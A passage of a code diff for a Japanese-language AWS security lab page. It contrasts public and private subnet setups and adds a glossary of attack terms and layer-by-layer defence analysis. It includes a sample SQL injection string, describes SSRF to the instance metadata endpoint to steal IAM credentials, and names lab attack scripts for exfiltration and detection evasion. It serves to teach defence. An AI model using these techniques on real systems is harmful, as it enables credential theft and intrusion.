+                    <p class="primer-why">なぜ重要か: ALB + AWS Shield で L3/L4 はかなり吸収できるが、L7 は WAF と rate-based rule 設計が要る。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Zero-day</span>
+                    <p class="primer-def">公開されていない未パッチ脆弱性。「ゼロデイ漁り (zero-day hunting)」とは攻撃者がスキャンで見つけた公開資産を未公表脆弱性で侵害すること。</p>
+                    <p class="primer-why">なぜ重要か: パッチ運用では防げない領域。攻撃面そのものを減らす Private 配置の意義はここにある。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">CVE</span>
+                    <p class="primer-def">公開済み脆弱性に振られる識別番号 (例: <code class="font-mono text-xs">CVE-2021-44228</code> = Log4Shell)。 WAF はこれら既知パターンをシグネチャ化して防御する。</p>
+                    <p class="primer-why">なぜ重要か: 既知 CVE は「公開直後 24h で攻撃自動化される」前提で備える。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">SQL Injection</span>
+                    <p class="primer-def">Web フォーム等から不正な SQL 文字列を注入し、 DB の意図しない操作を行う攻撃 (<code class="font-mono text-xs">' OR '1'='1</code> 等)。 OWASP Top 10 の常連。</p>
+                    <p class="primer-why">なぜ重要か: L7 攻撃の代表。 Private 配置は無力で、パラメータバインドと WAF が要る。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">XSS</span>
+                    <p class="primer-def">攻撃者の JavaScript を被害者ブラウザで実行させる攻撃。 Reflected / Stored / DOM-based の 3 種。</p>
+                    <p class="primer-why">なぜ重要か: ネットワーク層では一切防げない。出力エスケープと CSP が一次防御。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">SSRF</span>
+                    <p class="primer-def">サーバ側プロセスから任意 URL に HTTP リクエストを発行させる攻撃。本ラボの中核 (<code class="font-mono text-xs">/fetch?url=...</code>)。 IMDS の link-local IP に到達する経路として悪用される。</p>
+                    <p class="primer-why">なぜ重要か: Private 配置でも IMDS は動くので、SSRF は Public/Private 双方に等しく刺さる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Lateral Movement</span>
+                    <p class="primer-def">侵害したホストから同一ネットワーク内の別ホストへ侵入を広げる行為。</p>
+                    <p class="primer-why">なぜ重要か: 1 台破られた後の被害規模を決める。SG の "tier 別分割" が効く局面。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">C2 (Command &amp; Control)</span>
+                    <p class="primer-def">侵害後に攻撃者が遠隔操作するための通信チャネル。 HTTPS / DNS / ICMP に偽装される。</p>
+                    <p class="primer-why">なぜ重要か: NAT GW では検出できない。VPC Endpoint の絞り込み・egress proxy 等の設計が問われる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Data Exfiltration</span>
+                    <p class="primer-def">機密データの外部持ち出し。 S3, Pastebin, DNS, 自前 HTTPS サーバなど。</p>
+                    <p class="primer-why">なぜ重要か: 最終的なビジネス被害はここで発生する。 outbound 先の whitelist が最後の砦。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">OWASP Top 10</span>
+                    <p class="primer-def">Web アプリの代表的 10 大リスクを定期更新するコミュニティリスト。 SQLi / XSS / SSRF などはここで定義。</p>
+                    <p class="primer-why">なぜ重要か: WAF Managed Rules や SAST のシグネチャが OWASP に紐づく。共通言語。</p>
+                  </div>
+                </div>
+              </div>
+            </details>
+
+            <!-- ===== Category 6: ALB と WAF ===== -->
+            <details class="primer-cat">
+              <summary>
+                <i data-lucide="git-merge" class="h-5 w-5 text-indigo-500" aria-hidden="true"></i>
+                <span>6. ALB と WAF — L7 でできる防御</span>
+                <span class="ml-2 text-xs font-normal text-slate-500 dark:text-slate-400">8 用語</span>
+                <i data-lucide="chevron-right" class="primer-chev h-4 w-4" aria-hidden="true"></i>
+              </summary>
+              <div class="primer-body">
+                <p class="primer-overview">
+                  ALB は L7 ロードバランサで、「HTTP の中身を見て」転送先を決める。 WAF は ALB 等にアタッチして HTTP リクエストの内容を検査・拒否する仕組み。
+                </p>
+                <div class="primer-svg-wrap">
+                  <svg viewBox="0 0 600 250" class="block h-auto w-full" role="img" aria-labelledby="primer-alb-title primer-alb-desc">
+                    <title id="primer-alb-title">Client → WAF → ALB → Target Group の流れ</title>
+                    <desc id="primer-alb-desc">
+                      WAF が SQLi/XSS シグネチャをドロップ。ALB が Host/Path で Target Group に振り分ける。
+                    </desc>
+                    <g font-family="Inter, sans-serif">
+                      <rect x="20" y="100" width="80" height="40" rx="6" fill="#fff" stroke="#64748b" />
+                      <text x="60" y="125" text-anchor="middle" font-size="11" font-weight="600" fill="#334155">Client</text>
+
+                      <rect x="140" y="100" width="80" height="40" rx="6" fill="#fef3c7" stroke="#f59e0b" stroke-width="2" />
+                      <text x="180" y="120" text-anchor="middle" font-size="11" font-weight="700" fill="#92400e">WAF</text>
+                      <text x="180" y="135" text-anchor="middle" font-size="9" fill="#b45309">SQLi/XSS</text>
+
+                      <rect x="260" y="100" width="80" height="40" rx="6" fill="#eef2ff" stroke="#6366f1" stroke-width="2" />
+                      <text x="300" y="120" text-anchor="middle" font-size="11" font-weight="700" fill="#3730a3">ALB</text>
+                      <text x="300" y="135" text-anchor="middle" font-size="9" fill="#4338ca">L7 routing</text>
+
+                      <rect x="400" y="40" width="160" height="40" rx="6" fill="#ecfdf5" stroke="#10b981" />
+                      <text x="480" y="65" text-anchor="middle" font-size="11" font-weight="600" fill="#065f46">TG: api.example.com</text>
+
+                      <rect x="400" y="100" width="160" height="40" rx="6" fill="#ecfdf5" stroke="#10b981" />
+                      <text x="480" y="125" text-anchor="middle" font-size="11" font-weight="600" fill="#065f46">TG: /admin/*</text>
+
+                      <rect x="400" y="160" width="160" height="40" rx="6" fill="#ecfdf5" stroke="#10b981" />
+                      <text x="480" y="185" text-anchor="middle" font-size="11" font-weight="600" fill="#065f46">TG: default</text>
+
+                      <line x1="100" y1="120" x2="140" y2="120" stroke="#6366f1" stroke-width="2" marker-end="url(#primer-arrow-indigo)" />
+                      <line x1="220" y1="120" x2="260" y2="120" stroke="#6366f1" stroke-width="2" marker-end="url(#primer-arrow-indigo)" />
+                      <line x1="340" y1="115" x2="400" y2="60"  stroke="#10b981" stroke-width="1.6" marker-end="url(#primer-arrow-emerald)" />
+                      <line x1="340" y1="120" x2="400" y2="120" stroke="#10b981" stroke-width="1.6" marker-end="url(#primer-arrow-emerald)" />
+                      <line x1="340" y1="125" x2="400" y2="180" stroke="#10b981" stroke-width="1.6" marker-end="url(#primer-arrow-emerald)" />
+
+                      <text x="180" y="170" text-anchor="middle" font-size="10" fill="#7f1d1d">↓ block on match</text>
+                      <line x1="180" y1="140" x2="180" y2="195" stroke="#dc2626" stroke-width="1.6" marker-end="url(#primer-arrow-red)" />
+                      <text x="180" y="215" text-anchor="middle" font-size="10" font-family="JetBrains Mono, monospace" fill="#7f1d1d">403 Forbidden</text>
+                    </g>
+                  </svg>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div class="primer-card">
+                    <span class="primer-term">Load Balancer (LB)</span>
+                    <p class="primer-def">リクエストを複数バックエンドに振り分ける装置。 L4 LB (NLB) は IP/Port で、 L7 LB (ALB) は HTTP の中身で振り分ける。</p>
+                    <p class="primer-why">なぜ重要か: どの層で振り分けるかで「介在で見える情報」が変わる。WAF が機能できる前提。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">L7 Load Balancer (ALB)</span>
+                    <p class="primer-def">HTTP/HTTPS で動作。 SSH や DB プロトコルは流せない (= フォワードしない)。これが「ALB の介在で 22, 5432 が物理的に届かない」理由。</p>
+                    <p class="primer-why">なぜ重要か: ALB は「L7 以外のプロトコルを構造的に弾く」自然な防御層になる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Host-based Routing</span>
+                    <p class="primer-def"><code class="font-mono text-xs">Host: api.example.com</code> ヘッダの値で転送先を変える ALB ルール。誤設定で内部限定アプリを露出するリスクもある。</p>
+                    <p class="primer-why">なぜ重要か: マルチテナント設計で必須。default action の設定漏れが内部アプリ露出を生む。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">Path-based Routing</span>
+                    <p class="primer-def"><code class="font-mono text-xs">/admin/*</code> 等の URL パスで転送先を変える ALB ルール。</p>
+                    <p class="primer-why">なぜ重要か: <code class="font-mono text-xs">/admin</code> 系のパスは別 TG + 追加 IP 制限が定石。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">WAF</span>
+                    <p class="primer-def">HTTP リクエストの中身 (URL, ヘッダ, ボディ) をシグネチャ/ルールで検査する FW。 SQLi / XSS / 既知 CVE パターンをエッジで拒否する。 AWS WAF は ALB / CloudFront / API Gateway にアタッチ可能。</p>
+                    <p class="primer-why">なぜ重要か: ネットワーク層では防げない L7 攻撃の唯一の入口チェックポイント。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">AWS Managed Rules</span>
+                    <p class="primer-def">WAF 用の AWS 提供ルールセット (Known Bad Inputs, SQL Database, Linux OS など)。</p>
+                    <p class="primer-why">なぜ重要か: 自前ルール作成より早く、CVE 公開直後の自動防御に追従しやすい。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">HTTP Request Smuggling</span>
+                    <p class="primer-def">ALB と backend で同じリクエストを違うバウンダリで解釈させる攻撃。 CL.TE / TE.CL の不一致を悪用。</p>
+                    <p class="primer-why">なぜ重要か: ALB を信頼しすぎると、smuggling で WAF / ALB を素通りさせられる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">TLS Termination</span>
+                    <p class="primer-def">ALB が HTTPS を復号して backend に HTTP で渡す挙動。これにより WAF は平文を検査できる。</p>
+                    <p class="primer-why">なぜ重要か: 「ALB の内側 = 信頼ゾーン」と誤認しないこと。 ALB-to-EC2 の TLS 再暗号化も検討対象。</p>
+                  </div>
+                </div>
+              </div>
+            </details>
+
+            <!-- ===== Category 7: AWS 特有の特殊 IP / サービス ===== -->
+            <details class="primer-cat">
+              <summary>
+                <i data-lucide="key-round" class="h-5 w-5 text-indigo-500" aria-hidden="true"></i>
+                <span>7. AWS 特有の特殊 IP / サービス</span>
+                <span class="ml-2 text-xs font-normal text-slate-500 dark:text-slate-400">7 用語</span>
+                <i data-lucide="chevron-right" class="primer-chev h-4 w-4" aria-hidden="true"></i>
+              </summary>
+              <div class="primer-body">
+                <p class="primer-overview">
+                  本ラボの中核攻撃 (SSRF → IMDS) を理解するためには、 link-local IP と IMDS、そして SSH の代替である SSM の理解が必要。
+                </p>
+                <div class="primer-svg-wrap">
+                  <svg viewBox="0 0 600 280" class="block h-auto w-full" role="img" aria-labelledby="primer-imds-title primer-imds-desc">
+                    <title id="primer-imds-title">EC2 内部から IMDS (169.254.169.254) への到達経路</title>
+                    <desc id="primer-imds-desc">
+                      IMDS は VPC routing 管轄外。Subnet が Public か Private かは無関係。 EC2 内部からのみアクセスできる。
+                    </desc>
+                    <g font-family="Inter, sans-serif">
+                      <rect x="40" y="40" width="320" height="200" rx="10" fill="#f8fafc" stroke="#94a3b8" stroke-dasharray="6 4" />
+                      <text x="55" y="60" font-size="11" font-weight="700" fill="#475569">EC2 Instance (内部)</text>
+
+                      <rect x="60" y="80" width="120" height="50" rx="8" fill="#fff" stroke="#dc2626" stroke-width="2" />
+                      <text x="120" y="100" text-anchor="middle" font-size="11" font-weight="700" fill="#7f1d1d">App Process</text>
+                      <text x="120" y="118" text-anchor="middle" font-size="9" fill="#991b1b">SSRF endpoint</text>
+
+                      <rect x="220" y="80" width="120" height="50" rx="8" fill="#fff" stroke="#64748b" />
+                      <text x="280" y="100" text-anchor="middle" font-size="11" font-weight="600" fill="#334155">Local NIC</text>
+                      <text x="280" y="118" text-anchor="middle" font-size="9" fill="#475569">link-local route</text>
+
+                      <line x1="180" y1="105" x2="220" y2="105" stroke="#dc2626" stroke-width="2" marker-end="url(#primer-arrow-red)" />
+
+                      <rect x="60" y="170" width="280" height="50" rx="8" fill="#fee2e2" stroke="#dc2626" stroke-width="2" />
+                      <text x="200" y="190" text-anchor="middle" font-size="11" font-weight="700" fill="#7f1d1d">IMDS @ 169.254.169.254</text>
+                      <text x="200" y="208" text-anchor="middle" font-size="9" fill="#991b1b">IAM credential / instance-id</text>
+
+                      <line x1="280" y1="130" x2="200" y2="170" stroke="#dc2626" stroke-width="2" marker-end="url(#primer-arrow-red)" />
+
+                      <rect x="400" y="60" width="170" height="180" rx="10" fill="#fff7ed" stroke="#f59e0b" stroke-dasharray="4 3" />
+                      <text x="415" y="80" font-size="11" font-weight="700" fill="#92400e">VPC Routing</text>
+                      <text x="415" y="100" font-size="10" fill="#b45309">169.254.0.0/16 は</text>
+                      <text x="415" y="116" font-size="10" fill="#b45309">RFC 3927 link-local。</text>
+                      <text x="415" y="132" font-size="10" fill="#b45309">VPC Route Table の</text>
+                      <text x="415" y="148" font-size="10" fill="#b45309">管轄外 = Subnet が</text>
+                      <text x="415" y="164" font-size="10" fill="#b45309">Public/Private に関係なく</text>
+                      <text x="415" y="180" font-size="10" fill="#b45309">EC2 内部から到達可能</text>
+                      <text x="415" y="210" font-size="10" font-weight="700" fill="#92400e">→ Private 化では</text>
+                      <text x="415" y="226" font-size="10" font-weight="700" fill="#92400e">  IMDS は守れない</text>
+                    </g>
+                  </svg>
+                </div>
+                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                  <div class="primer-card">
+                    <span class="primer-term">Link-local IP (169.254.0.0/16)</span>
+                    <p class="primer-def">RFC 3927 で定義された「同一リンク内のみ有効」な IP レンジ。ルータを越えない。 AWS は <code class="font-mono text-xs">169.254.169.254</code> を IMDS に予約。</p>
+                    <p class="primer-why">なぜ重要か: link-local は VPC Route Table の対象外。サブネット種別と無関係に EC2 内部から到達する。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">IMDS</span>
+                    <p class="primer-def">EC2 が自身のメタデータ (instance-id, AMI, IAM role の credential など) を取得するサービス。 <code class="font-mono text-xs">169.254.169.254</code> で listen。 VPC routing 管轄外であり、 Subnet の Public/Private は無関係。</p>
+                    <p class="primer-why">なぜ重要か: SSRF + IMDSv1 で IAM credential が抜ける。 Private 化は防御にならない。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">IMDSv1</span>
+                    <p class="primer-def">単純な GET だけで credential が取れる方式。 SSRF と相性が悪い (脆弱)。</p>
+                    <p class="primer-why">なぜ重要か: 既存 EC2 が IMDSv1 のまま放置されると SSRF 1 回で IAM 権限が奪われる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">IMDSv2</span>
+                    <p class="primer-def">PUT で セッショントークンを取り、 GET ヘッダに付ける必要がある方式。 GET-only SSRF を遮断できる。 <code class="font-mono text-xs">http_tokens = "required"</code> で強制。</p>
+                    <p class="primer-why">なぜ重要か: 必須化が SSRF 対策の決定打。新規構築では default required にする。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">SSM Session Manager</span>
+                    <p class="primer-def">SSH を使わず AWS IAM 認証で EC2 に接続する仕組み。 22 ポートを開ける必要がない。 <code class="font-mono text-xs">ssm-agent</code> が outbound で SSM endpoint と通信し、双方向セッションを確立。</p>
+                    <p class="primer-why">なぜ重要か: 22 を世界に開ける必要がなくなり、Private 配置でも管理可能になる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">VPC Endpoint</span>
+                    <p class="primer-def">AWS API トラフィックを VPC 内に閉じる仕組み。 Gateway Endpoint (S3 / DynamoDB) と Interface Endpoint (それ以外) がある。</p>
+                    <p class="primer-why">なぜ重要か: outbound を VPC 外に出さずに AWS API を呼べる = exfil 経路を絞れる。</p>
+                  </div>
+                  <div class="primer-card">
+                    <span class="primer-term">aws:SourceVpc / aws:SourceVpce</span>
+                    <p class="primer-def">IAM ポリシーの条件キー。「この VPC からの API 呼び出しのみ許可」と指定でき、盗難認証情報を VPC 外で無効化できる。</p>
+                    <p class="primer-why">なぜ重要か: credential が漏れても「うちの VPC 外では使えない」という最後の鍵になる。</p>
+                  </div>
+                </div>
+              </div>
+            </details>
+          </section>
           <!-- ===== Section 4 — Network Layer Diff ===== -->
           <section id="section-network-diff" class="mt-16 scroll-mt-20">
             <header class="mb-6">
@@ -978,27 +1753,59 @@ def fetch():
               </table>
             </div>
           </section>
-          <!-- ===== Section 8 — Layer-by-Layer Analysis ===== -->
+          <!-- ===== Section 8 — Layer-by-Layer Analysis (Deep Dive) ===== -->
           <section id="section-layer-analysis" class="mt-16 scroll-mt-20">
             <header class="mb-6">
               <p
                 class="text-sm font-semibold uppercase tracking-wider text-indigo-600 dark:text-indigo-400"
               >
-                Section 8 / Layers
+                Section 8 / Layers Deep Dive
               </p>
               <h2
                 class="mt-1 text-2xl font-bold tracking-tight text-slate-900 dark:text-white sm:text-3xl"
               >
-                Layer-by-Layer Analysis — なぜ防げる / 防げないのか
+                Layer-by-Layer Analysis — 攻撃カタログと SVG 図解で見る防御の効き目
               </h2>
               <p
-                class="mt-2 max-w-prose text-sm leading-relaxed text-slate-600 dark:text-slate-400"
+                class="mt-2 max-w-3xl text-sm leading-relaxed text-slate-600 dark:text-slate-400"
               >
-                Private Subnet がどの層に効き、どの層では役に立たないのかをレイヤーで分解します。
-                各カードに <strong class="text-slate-800 dark:text-slate-100">"なぜ防げる / 防げないか"</strong> の具体メカニズムを併記します。
+                6 レイヤー (Network Boundary / Application / AWS API・IAM / ALB / VPC Internal / Outbound) ごとに
+                <strong class="text-slate-800 dark:text-slate-100">具体的な攻撃名と実コマンド</strong>、
+                <strong class="text-slate-800 dark:text-slate-100">Config A vs B の攻撃フロー SVG</strong>、
+                防御メカニズム、追加対策を併記します。
+                Private 配置という「単一防御」が効くレイヤーと効かないレイヤーが視覚的に分離されます。
               </p>
+              <!-- Layer quick nav -->
+              <nav aria-label="Layer quick navigation" class="mt-4 flex flex-wrap items-center gap-2 text-xs">
+                <span class="font-semibold uppercase tracking-wider text-slate-500 dark:text-slate-400">Jump to:</span>
+                <a href="#layer-network-boundary" class="rounded-full border border-emerald-300 bg-emerald-50 px-2.5 py-1 font-mono font-semibold text-emerald-800 hover:bg-emerald-100 dark:border-emerald-700 dark:bg-emerald-950/50 dark:text-emerald-200">L1 Network</a>
+                <a href="#layer-application" class="rounded-full border border-red-300 bg-red-50 px-2.5 py-1 font-mono font-semibold text-red-800 hover:bg-red-100 dark:border-red-700 dark:bg-red-950/50 dark:text-red-200">L2 App</a>
+                <a href="#layer-aws-api" class="rounded-full border border-red-300 bg-red-50 px-2.5 py-1 font-mono font-semibold text-red-800 hover:bg-red-100 dark:border-red-700 dark:bg-red-950/50 dark:text-red-200">L3 IAM</a>
+                <a href="#layer-alb" class="rounded-full border border-amber-300 bg-amber-50 px-2.5 py-1 font-mono font-semibold text-amber-800 hover:bg-amber-100 dark:border-amber-700 dark:bg-amber-950/50 dark:text-amber-200">L4 ALB</a>
+                <a href="#layer-vpc-internal" class="rounded-full border border-red-300 bg-red-50 px-2.5 py-1 font-mono font-semibold text-red-800 hover:bg-red-100 dark:border-red-700 dark:bg-red-950/50 dark:text-red-200">L5 Internal</a>
+                <a href="#layer-outbound" class="rounded-full border border-red-300 bg-red-50 px-2.5 py-1 font-mono font-semibold text-red-800 hover:bg-red-100 dark:border-red-700 dark:bg-red-950/50 dark:text-red-200">L6 Egress</a>
+              </nav>
             </header>
-            <div id="layer-cards" class="grid gap-4 md:grid-cols-2 xl:grid-cols-3"></div>
+
+            <!-- SVG marker defs (shared across all layer diagrams) -->
+            <svg width="0" height="0" aria-hidden="true" focusable="false" class="absolute">
+              <defs>
+                <marker id="arrow-red" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="rgb(239 68 68)" />
+                </marker>
+                <marker id="arrow-emerald" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="rgb(16 185 129)" />
+                </marker>
+                <marker id="arrow-slate" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="rgb(100 116 139)" />
+                </marker>
+                <marker id="arrow-amber" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                  <path d="M 0 0 L 10 5 L 0 10 z" fill="rgb(245 158 11)" />
+                </marker>
+              </defs>
+            </svg>
+
+            <div id="layer-deep-dive" class="space-y-2"></div>
           </section>
 
           <!-- ===== Section 9 — Defense Matrix ===== -->
@@ -1313,6 +2120,7 @@ def fetch():
         { id: "section-hero", label: "Hero" },
         { id: "section-toggle", label: "Config Toggle" },
         { id: "section-topology", label: "Network Topology" },
+        { id: "section-primer", label: "Primer" },
         { id: "section-network-diff", label: "Network Layer" },
         { id: "section-hybrid", label: "Hybrid Scenario" },
         { id: "section-app-layer", label: "Application Layer" },
@@ -1366,130 +2174,870 @@ def fetch():
       }
 
       // ============================================================
-      // Layer-by-Layer Analysis cards
+      // Layer-by-Layer Deep Dive — attack catalogs + SVG diagrams
+      // Each layer has: header, attacks[], svg, mechanism, hardening[]
       // ============================================================
-      const LAYER_CARDS = [
-        {
-          title: "Network Boundary",
-          status: "IMPROVED",
-          tone: "emerald",
-          icon: "shield-check",
-          summary:
-            "Private + ALB により外部到達面が大幅に縮小。Port scan / SSH / Direct DB が遮断される。",
-          mechanismLabel: "なぜ Private 配置で防げるか",
-          mechanism:
-            "Private Subnet には IGW へのデフォルトルートが存在せず、EC2 自体に Public IP が付与されない。これにより外部から ICMP / TCP レベルでの不可達性が成立する。SG (ステートフル FW) で同等の効果を得ることもできるが、SG はミスが許されない構成 (誤って 0.0.0.0/0 を許可) に対して脆弱。Subnet レベルの不可達性は Defense in Depth として SG の上に追加された層になる。",
-          scripts: ["scripts/01_portscan.sh", "scripts/02_ssh_probe.sh", "scripts/05_db_probe.sh"],
-        },
-        {
-          title: "Application Layer",
-          status: "NOT MITIGATED",
-          tone: "red",
-          icon: "alert-triangle",
-          summary:
-            "ALB は HTTP を素通し。SSRF, web vuln, /fetch endpoint は両 Config で成立する。",
-          mechanismLabel: "なぜ Private 配置では防げないか",
-          mechanism:
-            "SSRF はアプリプロセス内部からの HTTP リクエストによって発生する。EC2 の出口は (Config B でも) NAT GW 経由でインターネットに繋がっており、また IMDS の link-local IP (169.254.169.254) は EC2 ローカルからのみ到達可能で、VPC 境界の概念外。よってネットワーク境界をどう設計しても、アプリが任意 URL をフェッチできる限り IMDS には届く。対策は IMDSv2 強制 / SSRF 修正 / WAF パターンマッチが本筋。",
-          scripts: ["scripts/03_web_scan.sh", "scripts/04_ssrf_metadata.sh", "scripts/10_ssrf_internal_recon.sh"],
-        },
-        {
-          title: "AWS API / IAM Layer",
-          status: "NOT MITIGATED",
-          tone: "red",
-          icon: "key-round",
-          summary:
-            "盗まれた IAM credentials は AWS control plane で動くため VPC 境界を超える。SCP + aws:SourceVpc が必要。",
-          mechanismLabel: "なぜ Private 配置では防げないか",
-          mechanism:
-            "IAM 認証情報による AWS API 呼び出しは sts.amazonaws.com / s3.amazonaws.com など AWS のグローバル / リージョナルエンドポイント宛に行われ、VPC のトポロジ (Public / Private) とは独立した経路で評価される。盗まれたクレデンシャルは攻撃者の手元から世界中どこでも使えるため、VPC 境界の有無は無関係。塞ぐには IAM ポリシーの aws:SourceVpc / aws:SourceVpce 条件、SCP、Permission Boundary など API 層側の制約が必要。",
-          scripts: ["scripts/11_iam_privilege_escalation.sh", "scripts/15_iam_blast_radius.sh", "scripts/08_post_exploitation.sh"],
-        },
-        {
-          title: "ALB Proxy Layer",
-          status: "NEW SURFACE",
-          tone: "amber",
-          icon: "layers",
-          summary:
-            "Config B 限定で生まれる新しい攻撃面。Host header injection, HTTP method tampering 等。WAF + HTTPS 強制で対処。",
-          mechanismLabel: "なぜ ALB 自体が攻撃面になるか",
-          mechanism:
-            "ALB は HTTP/HTTPS ヘッダを後段に転送する設計のため、Host / X-Forwarded-For / Method 等が backend のロジック (キャッシュキー、認可、リダイレクト) に流れ込む。ALB は HTTP/2 の正規化や oversized header の拒否は行うが、アプリの判定ロジックそのものを保護はしない。AWS WAF の rule-based filtering、host-based listener rule、HTTPS-only enforcement、access logs を組み合わせる必要がある。",
-          scripts: ["scripts/12_alb_attacks.sh"],
-        },
-        {
-          title: "Outbound",
-          status: "NOT MITIGATED",
-          tone: "red",
-          icon: "arrow-up-right",
-          summary:
-            "NAT GW は egress を絞らない。C2 channel / data exfiltration を防ぐには Network Firewall + DNS Firewall。",
-          mechanismLabel: "なぜ Private 配置では防げないか",
-          mechanism:
-            "NAT Gateway は「インターネットに出すかどうか」しか制御しない (送信元 IP の集約と stateful translation のみ)。宛先 IP / ドメイン / プロトコルでの egress 制限は提供しない。よって C2 サーバ宛ての HTTPS / DNS exfil / 細工した DNS query はすべて素通り。塞ぐには AWS Network Firewall の suricata ルール、Route 53 Resolver DNS Firewall でのドメイン名ブロック、egress SG での宛先 IP 制限を多層で適用する必要がある。",
-          scripts: ["scripts/06_outbound_check.sh", "scripts/13_outbound_c2.sh", "scripts/16_data_exfiltration.sh"],
-        },
-        {
-          title: "VPC Internal Network",
-          status: "NOT MITIGATED",
-          tone: "red",
-          icon: "network",
-          summary:
-            "VPC 内部は両 Config 同条件。micro-segmentation と SG ベースの厳密な隔離が必要。",
-          mechanismLabel: "なぜ Private 配置では防げないか",
-          mechanism:
-            "Private 配置は「外から内」の到達は塞ぐが、「内から内」の lateral movement は塞がない。同一 VPC 内では Subnet 間ルーティングが local route で常時開通しており、SG が許可した範囲では EC2 間 / EC2 → RDS / EC2 → 別ワークロードへの通信が通る。塞ぐには SG の relference rule で App ↔ DB 以外の通信を deny、Network ACL でサブネット粒度の遮断、AWS Network Firewall でのマイクロセグメンテーションが必要。",
-          scripts: ["scripts/09_internal_recon.sh", "scripts/14_ssrf_to_rds.sh", "scripts/18_detection_evasion.sh"],
-        },
-      ];
-
-      const TONE_STYLES = {
+      const LAYER_TONE = {
         emerald: {
           border: "border-emerald-300 dark:border-emerald-700/60",
-          bg: "bg-emerald-50/70 dark:bg-emerald-950/30",
+          bg: "bg-emerald-50/40 dark:bg-emerald-950/20",
+          ring: "ring-emerald-200 dark:ring-emerald-800",
           icon: "text-emerald-600 dark:text-emerald-400",
-          badge: "bg-emerald-100 text-emerald-700 dark:bg-emerald-900/50 dark:text-emerald-200",
+          badge: "bg-emerald-600 text-white dark:bg-emerald-500",
+          accent: "text-emerald-700 dark:text-emerald-300",
         },
         red: {
           border: "border-red-300 dark:border-red-700/60",
-          bg: "bg-red-50/70 dark:bg-red-950/30",
+          bg: "bg-red-50/40 dark:bg-red-950/20",
+          ring: "ring-red-200 dark:ring-red-800",
           icon: "text-red-600 dark:text-red-400",
-          badge: "bg-red-100 text-red-700 dark:bg-red-900/50 dark:text-red-200",
+          badge: "bg-red-600 text-white dark:bg-red-500",
+          accent: "text-red-700 dark:text-red-300",
         },
         amber: {
           border: "border-amber-300 dark:border-amber-700/60",
-          bg: "bg-amber-50/70 dark:bg-amber-950/30",
+          bg: "bg-amber-50/40 dark:bg-amber-950/20",
+          ring: "ring-amber-200 dark:ring-amber-800",
           icon: "text-amber-600 dark:text-amber-400",
-          badge: "bg-amber-100 text-amber-700 dark:bg-amber-900/50 dark:text-amber-200",
+          badge: "bg-amber-500 text-white dark:bg-amber-500",
+          accent: "text-amber-700 dark:text-amber-300",
         },
       };
 
+      // ---- SVG diagram builders (one per layer) ----
+      // Common style: 800x320 viewBox, scales responsively via class="w-full h-auto"
+      // Color tokens used inline: rgb(239 68 68) red, rgb(16 185 129) emerald,
+      //   rgb(245 158 11) amber, rgb(99 102 241) indigo, rgb(100 116 139) slate
+      // Markers are defined once in the section <defs> block above.
+
+      function svgNetworkBoundary() {
+        return `
+        <svg viewBox="0 0 820 340" role="img" aria-labelledby="svg-l1-title svg-l1-desc" class="w-full h-auto">
+          <title id="svg-l1-title">Network Boundary 攻撃フロー: Config A vs Config B</title>
+          <desc id="svg-l1-desc">Config A では masscan が IGW 経由で EC2 の Public IP に到達し SYN-ACK が返る。Config B では Private Subnet に IGW ルートがなくホスト自体が見えない。</desc>
+          <line x1="410" y1="20" x2="410" y2="320" stroke="rgb(148 163 184)" stroke-width="1" stroke-dasharray="4 4" />
+          <text x="200" y="32" text-anchor="middle" font-size="13" font-weight="700" fill="rgb(220 38 38)" font-family="Inter, sans-serif">Config A — Public Subnet</text>
+          <text x="615" y="32" text-anchor="middle" font-size="13" font-weight="700" fill="rgb(5 150 105)" font-family="Inter, sans-serif">Config B — Private Subnet</text>
+
+          <!-- Config A boxes -->
+          <rect x="20" y="60" width="100" height="46" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
+          <text x="70" y="80" text-anchor="middle" font-size="11" font-weight="700" fill="rgb(127 29 29)" font-family="Inter, sans-serif">Attacker</text>
+          <text x="70" y="96" text-anchor="middle" font-size="9" font-family="JetBrains Mono, monospace" fill="rgb(127 29 29)">masscan</text>
+
+          <rect x="170" y="60" width="70" height="46" rx="6" fill="rgb(241 245 249)" stroke="rgb(100 116 139)" stroke-width="1.5"/>
+          <text x="205" y="84" text-anchor="middle" font-size="11" font-weight="600" fill="rgb(30 41 59)" font-family="Inter, sans-serif">IGW</text>
+
+          <rect x="290" y="60" width="110" height="46" rx="6" fill="rgb(254 226 226)" stroke="rgb(220 38 38)" stroke-width="1.5"/>
